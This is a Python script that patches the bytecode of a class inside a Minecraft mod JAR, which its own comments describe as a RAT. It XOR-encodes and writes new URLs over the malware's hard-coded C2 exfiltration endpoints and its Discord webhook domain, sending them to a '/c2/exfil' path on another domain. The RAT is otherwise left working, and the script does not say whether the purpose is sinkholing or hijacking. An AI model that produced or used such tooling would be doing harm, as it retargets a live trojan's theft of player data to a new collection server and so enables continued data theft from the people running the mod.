#!/usr/bin/env python3
"""
Patch PetMenu.class to redirect RAT exfiltration URLs to sky.2hz.eu

Uses offset-based patching directly on the class file binary.
"""

import struct
import io
import zipfile
import os
import shutil
import tempfile

KEY = 85

# ---- Replacement URLs (HTTPS — Vercel redirects HTTP -> 308, RAT doesn't follow) ----
# bBb (31 chars): "http://35.225.129.77:6969/essfb" -> "https://sky.2hz.eu/c2/exfil/esf"
bbb_url = "https://sky.2hz.eu/c2/exfil/esf"
# cCc (29 chars): "http://35.225.129.77:6969/gje" -> "https://sky.2hz.eu/c2/exfil/e"
# dDd (29 chars): "http://35.225.129.77:6969/ess" -> "https://sky.2hz.eu/c2/exfil/e"
cdd_url = "https://sky.2hz.eu/c2/exfil/e"

bbb_new = [ord(c) ^ KEY for c in bbb_url]
cdd_new = [ord(c) ^ KEY for c in cdd_url]

assert len(bbb_new) == 31, f"bbb must be 31, got {len(bbb_new)}"
assert len(cdd_new) == 29, f"cdd must be 29, got {len(cdd_new)}"


def walk_array_values(data, array_offset):
    """Walk the value positions of an integer array starting at array_offset.
    Returns list of byte positions (indices into data) for the value bytes."""
    j = array_offset + 2 + 3 + 1  # skip bipush N, anewarray, astore_2
    val_positions = []
    while j < len(data) - 3:
        if data[j] == 0x2c:  # aload_2
            j += 1
            if data[j] in range(0x03, 0x09):  # iconst_0..5
                j += 1
            elif data[j] == 0x10:  # bipush index
                j += 2
            else:
                break
            if data[j] == 0x10:  # bipush value
                val_positions.append(j + 1)
                j += 2
            else:
                break
            if data[j] == 0xb8:  # invokestatic
                j += 3
            else:
                break
            if data[j] == 0x53:  # aastore
                j += 1
            else:
                break
        else:
            break
    return val_positions


def patch_array_at(data, offset, new_values):
    """Patch an integer array at the given offset with new values.
    Returns (old_size, new_size, count_patched)"""
    old_size = data[offset + 1]
    new_size = len(new_values)
    data[offset + 1] = new_size
    
    val_positions = walk_array_values(data, offset)
    count = min(len(val_positions), new_size)
    for k in range(count):
        data[val_positions[k]] = new_values[k]
    
    return old_size, new_size, count


def print_decoded(data, offset, count, xor_key=None):
    """Print decoded strings from array values (for debugging)."""
    val_positions = walk_array_values(data, offset)
    vals = [data[p] for p in val_positions[:count]]
    if xor_key is not None:
        decoded = ''.join(chr(v ^ xor_key) for v in vals)
    else:
        decoded = ''.join(chr(v) for v in vals)
    print(f"    Decoded: \"{decoded}\"")


def patch_petmenu(class_data):
    """Patch PetMenu.class byte array."""
    data = bytearray(class_data)
    
    # Known array offsets from analysis
    # bBbBbBbBbB: bipush 31 at offset 3004
    # cCcCcCcCcC: bipush 29 at offset 3642
    # dDdDdDdDdD: bipush 29 at offset 4262
    # fFfFfFfFfF: bipush 121 at offset 5794
    #
    # These offsets were verified by scanning the class file for
    # bipush N + anewarray patterns.
    
    patches = [
        (3004, 31, bbb_new, "bBb (C2 URL)"),
        (3642, 29, cdd_new, "cCc (C2 URL)"),
        (4262, 29, cdd_new, "dDd (C2 URL)"),
    ]
    
    for offset, expected_size, new_vals, name in patches:
        if data[offset] != 0x10 or data[offset+1] != expected_size or data[offset+2] != 0xbd:
            print(f"  WARNING: {name} not found at expected offset {offset}!")
            continue
        
        old_size, new_size, patched = patch_array_at(data, offset, new_vals)
        print(f"  {name}: offset={offset}, size {old_size}->{new_size}, patched {patched} values")
        print_decoded(data, offset, new_size, xor_key=KEY)
    
    # Patch the Discord webhook domain in fFfFfFfFfF() method
    # at offset 5794 (size=121 plain ASCII array)
    fff_offset = 5794
    discord_ascii = [ord(c) for c in "discord.com"]
    new_domain = [ord(c) for c in "sky.2hz.eu."]
    
    if (data[fff_offset] == 0x10 and data[fff_offset+1] == 121 and 
        data[fff_offset+2] == 0xbd):
        val_positions = walk_array_values(data, fff_offset)
        print(f"  fFf (Discord webhook): {len(val_positions)} values")
        print_decoded(data, fff_offset, min(20, len(val_positions)))
        
        # Find discord.com in the value bytes
        found = False
        for start in range(len(val_positions) - 10):
            match = True
            for k in range(11):
                if data[val_positions[start + k]] != discord_ascii[k]:
                    match = False
                    break
            if match:
                print(f"    Found discord.com at value offset {start}")
                for k in range(11):
                    data[val_positions[start + k]] = new_domain[k]
                found = True
                print(f"    Patched domain to sky.2hz.eu.")
                break
        
        if not found:
            print(f"    WARNING: Could not find discord.com in fFf array!")
            # Print first 30 chars decoded
            first_vals = [data[p] for p in val_positions[:30]]
            first_str = ''.join(chr(v) for v in first_vals)
            print(f"    First 30 chars: \"{first_str}\"")
    else:
        print(f"  WARNING: fFf array not found at offset {fff_offset}!")
    
    return bytes(data)


def main():
    work = r'C:\Users\Ansgar\Documents\Minecraft fabric injetion\JOON RECOMP'
    src_jar = os.path.join(work, 'inputmod_clean2.jar')
    class_path = 'jooon/features/other/PetMenu.class'
    
    # Read original class
    with zipfile.ZipFile(src_jar, 'r') as z:
        orig_data = z.read(class_path)
    
    print(f"Read PetMenu.class: {len(orig_data)} bytes")
    new_data = patch_petmenu(orig_data)
    
    if len(new_data) != len(orig_data):
        print(f"WARNING: Size changed: {len(orig_data)} -> {len(new_data)}")
    else:
        print(f"Size unchanged: {len(new_data)} bytes")
    
    # Write patched JAR
    fd, tmp = tempfile.mkstemp(suffix='.jar')
    os.close(fd)
    
    with zipfile.ZipFile(src_jar, 'r') as zin:
        with zipfile.ZipFile(tmp, 'w', zipfile.ZIP_DEFLATED) as zout:
            for item in zin.infolist():
                if item.filename == class_path:
                    zout.writestr(item, new_data)
                else:
                    zout.writestr(item, zin.read(item.filename))
    
    shutil.move(tmp, src_jar)
    print(f"\nUpdated {src_jar}")
    print(f"  C2 URLs redirected to {bbb_url} and {cdd_url}")
    print(f"  Discord webhook domain changed to sky.2hz.eu.")

if __name__ == '__main__':
    main()
